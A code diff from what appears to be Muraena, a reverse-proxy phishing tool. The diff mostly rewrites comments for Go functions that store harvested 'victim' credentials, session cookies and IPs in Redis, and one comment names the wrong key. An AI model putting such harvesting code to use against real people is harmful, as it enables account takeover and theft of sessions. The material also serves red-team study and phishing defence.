@@ -11,7 +11,7 @@ import (
 
 // Victim: a browser that interacts with Muraena
 // KEY scheme:
-// victim:<ID>
+// victim:Victim.ID
 type Victim struct {
 	ID                  string `redis:"id"`
 	IP                  string `redis:"ip"`
@@ -23,22 +23,22 @@ type Victim struct {
 	CookieJar           string `redis:"cookiejar_id"`
 	SessionInstrumented bool   `redis:"session_instrumented"`
 
-	Cookies     []VictimCookie `redis:"-"`
+	Cookies     []VictimCookie     `redis:"-"`
 	Credentials []VictimCredential `redis:"-"`
 }
 
-// VictimCredential: a victim has at least one set of credentials
+// VictimCredential: a set of credentials associated to a Victim
 // KEY scheme:
-// victim:<ID>:creds:<COUNT>
+// victim:Victim.ID:creds:<COUNT>
 type VictimCredential struct {
 	Key   string `redis:"key"`
 	Value string `redis:"val"`
 	Time  string `redis:"time"`
 }
 
-// VictimCookie: a victim has N cookies associated with its web session
+// VictimCookie: a set of HTTP cookies associated to the Victim's active session
 // KEY scheme:
-// victim:<ID>:cookiejar:<COOKIE_NAME>
+// victim:Victim.ID:cookiejar:VictimCookie.Name
 type VictimCookie struct {
 	Name     string `redis:"name" json:"name"`
 	Value    string `redis:"value" json:"value"`
@@ -51,7 +51,14 @@ type VictimCookie struct {
 	Session  bool   `redis:"session" json:"session"` // is the cookie a session cookie?
 }
 
-// Store saves a Victim in the database
+// Store sets the Victim struct in the hash stored at key victim:Victim.ID
+// This action overwrites any specified field already existing in the hash.
+// If key does not exist, a new key holding a hash is created.
+// Additionally, this function inserts the Victim.ID in the list: victims.
+//
+// Redis commands:
+// HMSET victim:Victim.ID Victim
+// RPUSH victims Victim.ID
 func (v *Victim) Store() error {
 
 	rc := session.RedisPool.Get()
@@ -72,7 +79,12 @@ func (v *Victim) Store() error {
 	return nil
 }
 
-// Store saves a VictimCredential in the database
+// Store sets the VictimCredential struct in the hash stored at key victim:Victim.ID:creds:Victim.CredsCount
+// This action overwrites any specified field already existing in the hash.
+// If key does not exist, a new key holding a hash is created.
+//
+// Redis commands:
+// HMSET victim:Victim.ID:creds:Victim.CredsCount VictimCredential
 func (vc *VictimCredential) Store(victimID string) error {
 
 	rc := session.RedisPool.Get()
@@ -104,7 +116,14 @@ func (vc *VictimCredential) Store(victimID string) error {
 	return nil
 }
 
-// Store saves a Cookie in the database
+// Store sets the VictimCookie struct in the hash stored at key victim:Victim.ID:cookiejar:VictimCookie.Name
+// This action overwrites any specified field already existing in the hash.
+// If key does not exist, a new key holding a hash is created.
+// Additionally, this function inserts the VictimCookie.Name in the list: victim:Victim.ID:cookiejar_entries.
+//
+// Redis commands:
+// HMSET victim:Victim.ID:cookiejar:VictimCookie.Name VictimCookie
+// RPUSH victim:Victim.ID:cookiejar_entries VictimCookie.Name
 func (vc *VictimCookie) Store(victimID string) error {
 
 	rc := session.RedisPool.Get()
@@ -125,6 +144,8 @@ func (vc *VictimCookie) Store(victimID string) error {
 
 	// check if the cookie is already stored.
 	// if it is, just updates its values but do not add an entry to the cookie names list
+	// TODO: Double check this behaviour. Cookie name is not enough to identify uniquely a cookie.
+	//  We need to map it to the origin instead (name, path, domain)
 	if vCookie.Name == "" {
 		// store the cookie name only if not present already
 		_, err = rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", victimID), vc.Name)
@@ -140,7 +161,10 @@ func (vc *VictimCookie) Store(victimID string) error {
 	return nil
 }
 
-// GetVictim returns a Victim from database
+// GetVictim returns a Victim
+//
+// Redis commands:
+// HGETALL victim:Victim.ID
 func GetVictim(victimID string) (*Victim, error) {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
@@ -157,6 +181,8 @@ func GetVictim(victimID string) (*Victim, error) {
 		return nil, err
 	}
 
+	// TODO: Review the autopopulate below, it might be a bullshit because it stress out the Redis.
+
 	// Populate Credentials
 	err = v.GetCredentials()
 	if err != nil {
@@ -172,7 +198,13 @@ func GetVictim(victimID string) (*Victim, error) {
 	return &v, nil
 }
 
-// GetCredentials returns a VictimCredential from database
+// GetCredentials retrieves the credentials of a Victims stored in the database.
+// This function populates the Victim.Credentials property.
+//
+// Redis commands:
+// HGETALL victim:Victim.ID:creds:...
+//
+// FIXME: Consider to rename this method to a more semantic one
 func (v *Victim) GetCredentials() error {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
@@ -204,7 +236,13 @@ func (v *Victim) GetCredentials() error {
 	return nil
 }
 
-// GetVictimCookiejar returns a slice of VictimCookie associated to a victim
+// GetVictimCookiejar retrieves the Cookie jar of a Victims stored in the database.
+// This function populates the Victim.Cookies property.
+//
+// Redis commands:
+// HGETALL victim:Victim.ID:creds:...
+//
+// FIXME: Consider to rename this method to a more semantic one
 func (v *Victim) GetVictimCookiejar() error {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
@@ -237,7 +275,10 @@ func (v *Victim) GetVictimCookiejar() error {
 	return nil
 }
 
-// GetAllVictims returns all the victim IDs stored in the database
+// GetAllVictims fetches all the stored Victim(s) in the database
+//
+// Redis commands:
+// LRANGE victims 0 -1
 func GetAllVictims() ([]Victim, error) {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
@@ -261,6 +302,12 @@ func GetAllVictims() ([]Victim, error) {
 	return victims, nil
 }
 
+// SetSessionAsInstrumented updates the Victim hash by setting the Victim.SessionInstrumented value to true.
+//
+// Redis commands:
+// HSET victim:Victim.ID session_istrumented true
+//
+// FIXME: Consider to use the Store function for this: update the Victim struct and then Victim.Store.
 func SetSessionAsInstrumented(victimID string) error {
 	rc := session.RedisPool.Get()
 	defer rc.Close()
